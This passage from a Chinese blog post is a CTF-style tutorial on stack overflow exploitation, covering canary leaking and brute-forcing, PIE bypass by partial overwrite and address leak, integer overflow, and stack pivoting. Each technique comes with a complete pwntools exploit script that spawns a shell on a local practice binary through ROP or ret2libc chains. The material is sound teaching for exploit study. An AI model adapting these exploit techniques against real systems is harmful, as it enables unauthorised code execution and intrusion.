+</div><div class="story post-story"><h2 id="击败cancary"><a href="#击败cancary" class="headerlink" title="击败cancary"></a>击败cancary</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>函数开始执行的时候会先往栈底插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法(栈帧销毁前测试该值是否被改</p>
+<p>变)，如果不合法就停止程序运行(发生了栈溢出);</p>
+<p>在Linux当中我们将这段cookie信息称为Canary ,Canary是一个低字节为\x00的16进制数;</p>
+<p>因为Canary在局部变量的后边,在EBP或RBP的前面所以当攻击者覆盖返回地址的时候往往也会将cookie信息给覆盖掉,这就会导致栈保护检查失败而阻止payload的执行,从而避免漏洞利用成功.</p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070908218.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070908218.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070908905.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070908905.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>方法一:泄露栈中的Canary:</p>
+<p>Canary设计为以字节×O0O结尾,其本意就是为了保证Canary 可以截断字符串,防止我们输出字符串的时候将Canary打印出来;所以泄露栈中的Canary的思路是将Canary的低字节\x00覆盖，然后连同用户的字符串一起打印出剩余的Canary部分;</p>
+<p>当我们打印出完整的Canary后,在溢出的时候再将正确Canary填回去,就可以进行控制返回地址,控制程序流程了.</p>
+<p>条件:</p>
+<p>1.有合适的输出函数</p>
+<p>2.泄露Canary后程序不会崩溃</p>
+<h3 id="例题：-1"><a href="#例题：-1" class="headerlink" title="例题："></a>例题：</h3><p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070920559.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070920559.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070921740.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070921740.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line">p = process(name)</span><br><span class="line">elf = ELF(name)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">28</span> + <span class="string">&quot;b&quot;</span>*<span class="number">4</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getshell_addr = <span class="number">0x804858b</span></span><br><span class="line">payload1 = <span class="string">b&quot;a&quot;</span>*<span class="number">32</span> + p32(canary) + <span class="string">b&quot;b&quot;</span>*<span class="number">12</span> + p32(getshell_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>方法二:爆破Canary:</p>
+<p>对于Canary,虽然每次进程重启后的Canary 不同(相比GS，GS重启后是相同的)但是同一个进程中的不同线程的Canary 是相同的,并且通过fork函数创建的子进程的Canary也是相同的,因为fork函数会直接拷贝父进程的内存。</p>
+<p>我们可以利用这样的特点，彻底逐个字节将Canary爆破出来.</p>
+<p>缺点:多进程程序,32位程序需要爆破3字节,64位程序需要爆破7字节,需要爆破较多.</p>
+<p>其他方法: 1.联合其他漏洞修改劫持_stack_chk_fail函数;</p>
+<p>例题：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070955279.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070955279.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070958299.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070958299.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">name = <span class="string">&#x27;./pwn2&#x27;</span></span><br><span class="line">p = process(name)</span><br><span class="line">elf = ELF(name)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(j))</span><br><span class="line">        p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="built_in">chr</span>(j))</span><br><span class="line">        a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;recv&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = u32(canary)</span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">getflag = <span class="number">0x0804863B</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + p32(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+</div><div class="story post-story"><h2 id="PIE绕过："><a href="#PIE绕过：" class="headerlink" title="PIE绕过："></a>PIE绕过：</h2><p>position-independent executable,地址无关可执行文件,该技术就是一个针对代码段.text,数据段.*data，.bss等固定地址的一个防护技术应用了PIE的程序会在每次加载时都变换加载基址，从而使ropper等工具无法得到准确的地址.</p>
+<p>方法一: Partial Write<br>部分写入技术,由于内存的页载入机制，PIE的随机化只能影响到单个内存页;通常来说,一个内存页大小为Ox1000,这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的就是利用了PIE后12位地址不变的特点,通过覆盖EIP的后8或16位(按字节写入每字节8位)就可以快速爆破或者直接劫持EIP;</p>
+<p>特点:</p>
+<p>1.程序不大,有后门函数等;<br>2.只需要爆破一个字节</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020358.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020358.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020616.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020616.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020918.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207071020918.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">	<span class="built_in">print</span> (i)</span><br><span class="line">	<span class="keyword">if</span>(i &gt; <span class="number">0xff</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	io = process(<span class="string">&quot;./partial_write&quot;</span>)	</span><br><span class="line">	io.recv()</span><br><span class="line">	payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>					</span><br><span class="line">	payload += <span class="string">&#x27;\xca&#x27;</span>	<span class="comment">#strncpy复制202个字节造成溢出				</span></span><br><span class="line">	io.sendline(payload)</span><br><span class="line">	io.recv()</span><br><span class="line">	payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">200</span>					</span><br><span class="line">	payload += <span class="string">&#x27;\x01\x39&#x27;</span>				<span class="comment">#frontdoor的地址后三位是0x900, +1跳过push rbp 爆破的是3</span></span><br><span class="line">	io.sendline(payload)</span><br><span class="line">	io.recv()</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		io.recv(timeout = <span class="number">1</span>)			</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		io.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">		sleep(<span class="number">0.1</span>)						</span><br><span class="line">		io.interactive()				<span class="comment">#没有EOFError的话就是爆破成功，可以开shell</span></span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>方法二:直接泄露地址<br>因为PIE影响的只是程序加载基址，并不会影响指令间的相对地址,如果我们可以泄露出一个程序或ibc的某些地址，我们就可以利用地址<br>减去偏移地址得到基地址,从而算出其他函数的地址,这种方法也是我们最常用的方法.<br>通过泄露地址来计算libc基地址的时候需要注意的是libc版本不同,对应的偏移也不同.</p>
+<h3 id="例题：-2"><a href="#例题：-2" class="headerlink" title="例题："></a>例题：</h3><p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207071037766.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207071037766.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line">p = process(name)</span><br><span class="line">elf = ELF(name)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Tell me your name:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">8</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">pro_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>) - <span class="number">0x82d</span></span><br><span class="line">puts_got_addr = pro_addr + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt_addr = pro_addr + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = pro_addr + elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;pro_addr: &quot;</span> + <span class="built_in">hex</span>(pro_addr))</span><br><span class="line">success(<span class="string">&quot;puts_got_addr: &quot;</span> + <span class="built_in">hex</span>(puts_got_addr))</span><br><span class="line">success(<span class="string">&quot;puts_plt_addr: &quot;</span> + <span class="built_in">hex</span>(puts_plt_addr))</span><br><span class="line">success(<span class="string">&quot;main_addr: &quot;</span> + <span class="built_in">hex</span>(main_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to say?\n&quot;</span>)</span><br><span class="line">pop_rdi_addr = pro_addr + <span class="number">0x843</span></span><br><span class="line">payload1 = <span class="string">b&quot;a&quot;</span>*<span class="number">184</span> </span><br><span class="line">payload1 += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr)</span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Bye!\n&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>) - <span class="number">0x68f90</span></span><br><span class="line">system_addr = libc_addr + <span class="number">0x3f480</span></span><br><span class="line">bin_sh_addr = libc_addr + <span class="number">0x1619d9</span></span><br><span class="line">success(<span class="string">&quot;libc_addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;bin_sh_addr: &quot;</span> + <span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Tell me your name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to say?\n&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;c&quot;</span>*<span class="number">184</span>  </span><br><span class="line">payload2 += p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+</div><div class="story post-story"><h2 id="整数溢出："><a href="#整数溢出：" class="headerlink" title="整数溢出："></a>整数溢出：</h2><p>类型一:未限制范围<br>这种情况主要是变量有固定大小的字节,但是却允许我们输入无限多的数据,和gets()函数产生的栈溢出很相似</p>
+<p>类型二:错误的类型转换<br>正确的对变量进行了约束但是在类型转换上面出错了,范围大的变量赋值给范围小的变量</p>
+<h3 id="例题：-3"><a href="#例题：-3" class="headerlink" title="例题："></a>例题：</h3><p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207082002448.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207082002448.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207082002373.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207082002373.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>程序为dest分配了0x14字节的储存空间，而第二个read函数可以读取0x199个字节，这个地方存在栈溢出</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">&quot;./int_over&quot;</span>)</span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span>*<span class="number">24</span> + <span class="built_in">p32</span>(<span class="number">0x804868b</span>)</span><br><span class="line">payload += b<span class="string">&quot;b&quot;</span>*(<span class="number">0x104</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;Please input your username:\n&quot;</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(<span class="string">&quot;sir&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;Please input your passwd:\n&quot;</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(payload)</span><br><span class="line">p.interactive</span><br></pre></td></tr></table></figure>
+
+</div><div class="story post-story"><h2 id="栈迁移："><a href="#栈迁移：" class="headerlink" title="栈迁移："></a>栈迁移：</h2><p>劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP等操作;<br>通俗的讲其实就是将ESP或RSP指针修改为我们可以控制的内存区地址比如bss段堆等位置,然后在可控内存区当中布置payload等;</p>
+<p>条件:</p>
+<p>1.程序存在溢出;<br>2.可以控制sp指针;</p>
+<p>用途:</p>
+<p>1.栈益出可以溢出的空间大小不足</p>
+<p>因为我们的主要思想是修改sp指针,所以我们需要通过一些汇编指令来修改sp指针,常用汇编指令:;</p>
+<p>1.pop esp;<br>2.pop ecx; lea esp,[ecx-Ox4];<br>3.leave; ret; —&gt; mov esp, ebp; pop ebp; ret;</p>
+<p>需要注意的地方:</p>
+<p>1.迁移过去的内存一定要可读可写;</p>
+<p>⒉.迁移过去的内存要注意离不可读不可写的内存要远一些,因为调用一些函数的时候需要较大的栈空间;</p>
+<p>3.我们构造的栈空间和程序的栈空间有相同的性质,即push,pop等操作对sp,bp指针的操作一样;</p>
+</div><div class="story post-story"><h2 id="例题：-4"><a href="#例题：-4" class="headerlink" title="例题："></a>例题：</h2><p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207082051726.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207082051726.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">&quot;./test1&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.<span class="built_in">attach</span>(p)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x80495d0</span></span><br><span class="line">system_plt = <span class="number">0x8048370</span></span><br><span class="line">read_plt = <span class="number">0x8048340</span></span><br><span class="line">leave_ret = <span class="number">0x80484d5</span></span><br><span class="line">pop3_ret = <span class="number">0x080485a9</span></span><br><span class="line">gadgets = <span class="number">0x8048549</span></span><br><span class="line">bss = <span class="number">0x804a560</span></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">p32</span>(read_plt) + <span class="built_in">p32</span>(pop3_ret) + <span class="built_in">p32</span>(<span class="number">0</span>) + <span class="built_in">p32</span>(bss) + <span class="built_in">p32</span>(<span class="number">100</span>) </span><br><span class="line">payload += <span class="built_in">p32</span>(gadgets) + <span class="built_in">p32</span>(bss + <span class="number">4</span>)</span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;Hello,tell me your story:\n&quot;</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(payload)</span><br><span class="line"></span><br><span class="line">payload1 = b<span class="string">&quot;b&quot;</span>*<span class="number">10</span> + <span class="built_in">p32</span>(<span class="number">0x804a060</span> + <span class="number">4</span>)</span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;By the way, what&#x27;s your name:\n&quot;</span>)</span><br><span class="line">p.<span class="built_in">sendline</span>(payload1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">sleep</span>(<span class="number">1</span>)</span><br><span class="line">payload2 = <span class="built_in">p32</span>(system_plt) + b<span class="string">&quot;aaaa&quot;</span> + <span class="built_in">p32</span>(bin_sh_addr) </span><br><span class="line">p.<span class="built_in">sendline</span>(payload2)</span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+</div>
+  </div>
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/>http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/</a></p>
+              
+            
+          </blockquote>
         </div>
+      
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-07-14T16:31:00+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2022年7月14日</p>
+  </a>
 </div>
 
-          </div>
         
       
-    
-  </section>
+        
+          
   
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>栈溢出</p></a></div>
+  <span hidden itemprop="keywords">栈溢出</span>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出 - 1ens's blog&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出 - 1ens's blog&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/&title=栈溢出 - 1ens's blog&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2022/07/06/pwn%E5%85%A5%E9%97%A8/'>
